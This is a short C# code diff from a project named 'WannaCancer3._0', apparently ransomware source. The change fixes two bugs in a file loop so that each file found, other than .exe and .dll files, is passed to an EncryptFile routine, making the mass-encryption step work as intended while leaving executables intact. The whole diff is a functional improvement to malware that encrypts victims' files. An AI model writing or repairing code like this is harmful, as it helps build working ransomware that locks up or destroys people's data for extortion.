@@ -56,9 +56,9 @@ namespace WannaCancer3._0
 
             foreach (string item in files)
             {
-                FileInfo file = new FileInfo(@"C:\Windows\System32\ta-IN");
+                FileInfo file = new FileInfo(item);
                 string fe = file.Extension;
-                if (fe != ".exe" || fe != ".dll")
+                if (fe != ".exe" && fe != ".dll")
                     EncryptFile(item);
             }
 
